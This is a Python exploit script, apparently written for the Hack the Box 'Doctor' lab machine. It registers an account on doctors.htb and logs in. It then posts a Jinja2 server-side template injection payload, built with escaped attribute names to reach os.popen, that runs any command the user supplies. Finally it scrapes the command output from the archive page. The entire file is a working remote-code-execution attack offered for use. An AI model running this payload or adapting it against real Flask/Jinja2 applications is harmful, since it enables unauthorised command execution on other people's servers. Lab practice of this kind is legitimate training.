#!/usr/bin/python3

import requests, argparse
from re import findall
from random import randint

# Parsing the commmand from the user.
parser = argparse.ArgumentParser(description = 'Hack the Box Doctor RCE')
parser.add_argument('-c', '--command', metavar = '<COMMAND>', type = str, required = True, help = "Command you want to be executed. eg. python rce.py -c 'whoami'")
parser.add_argument('-v', '--verbose', help = 'Increase output verbosity', action = 'store_true')
args = parser.parse_args()

def make_account(): # Creates account with a@a.a as email and a as password
    if args.verbose: # Feel free to ignore these lines, they just print info in verbose mode
        print("[\033[94m*\033[0m] Creating account with email: a@a.a and password: a") # These are ANSI escape characters which colour the characters on your terminal.
    url = "http://doctors.htb/register"
    data = {'username' : 'aa', 'email' : 'a@a.a', 'password' : 'a', 'confirm_password' : 'a', 'submit' : 'Sign Up'}
    try:
        requests.post(url, data = data)
    except:
        print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
        exit()
    if args.verbose:
        print("[\033[92m+\033[0m] Account created")

def get_cookie(): # Gets the cookie so we can post our message
    if args.verbose:
        print("[\033[94m*\033[0m] Getting login cookie")
    url = "http://doctors.htb/login"
    data = {'email' : 'a@a.a', 'password' : 'a', 'submit' : 'Login'}
    session = requests.Session()
    try:
        session.post(url, data = data)
        cookie = session.cookies.get_dict()
    except:
        print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
        exit()
    if args.verbose:
        print("[\033[92m+\033[0m] Cookie retrieved")
    return cookie

def send_payload(cookie, command): # Sends the command payload as the message title.
    if args.verbose:
        print("[\033[94m*\033[0m] Sending payload")
    message_id = "a" + str(randint(0, 10000)) # I created a message ID in case the command gives an error, the only way to fix the error and allow you to enter more commands is to delete the message. The message ID was my method of finding the message with the invalid command and deleting it.
    url = 'http://doctors.htb/post/new'
    payload = "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('" + command + "')|attr('read')()}}"
    data = {'title' : payload, 'content' : message_id, 'submit' : 'Post'}
    try:
        requests.post(url, cookies = cookie, data = data)
    except:
        print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
        exit()
    if args.verbose:
        print("[\033[92m+\033[0m] Payload sent")
    return message_id
    
def read_output(cookie, message_id): # Reads the output from the most recent command.
    if args.verbose:
        print("[\033[94m*\033[0m] Getting output from /archives")
    url = "http://doctors.htb/archive"
    try:
        response = requests.get(url, cookies = cookie)
    except:
        print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
        exit()
    if response.status_code == 500:
        print("[\033[91m-\033[0m] Invalid command, deleting message...")
        delete_message(cookie, message_id)
        exit()
    html = response.text
    outputs = findall(r'<title>\s*([\s\S]+?)\s*</title>', html) # Finds all outputs in the page source.
    output = outputs[-1] # Shows the most recent output (relevant to the most recent command).
    if args.verbose:
        print("[\033[92m+\033[0m] Output retrieved\n")
    return output

def delete_message(cookie, message_id):  # Finds the message to be deleted so the internal error goes away on the archives page.
    if args.verbose:
        print("[\033[36m*\033[0m] Deleting most recent message")
    counter = 0
    deleted = False
    while not(deleted):
        url = f'http://doctors.htb/post/{counter}'
        try:
            response = requests.get(url, cookies = cookie)
        except:
            print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
            exit()
        if response.status_code != 404:
            html = response.text
            message = findall(r'<p class="article-content">\s*([\s\S]+?)\s*</p>', html)
            if str(message[0]) == message_id:
                url += '/delete'
                try:
                    requests.post(url, cookies = cookie)
                except:
                    print("[\033[91m-\033[0m] Connection to host failed, check that you are on the Hack the Box VPN and that doctors.htb is in /etc/hosts with the correct IP (box might also be being reset)")
                    exit()
                deleted = True
        counter += 1    
    print("[\033[92m+\033[0m] Message deleted, re-run again with valid command")


make_account()
cookie = get_cookie()
command = args.command
message_id = send_payload(cookie, command)
output = read_output(cookie, message_id)
print(output)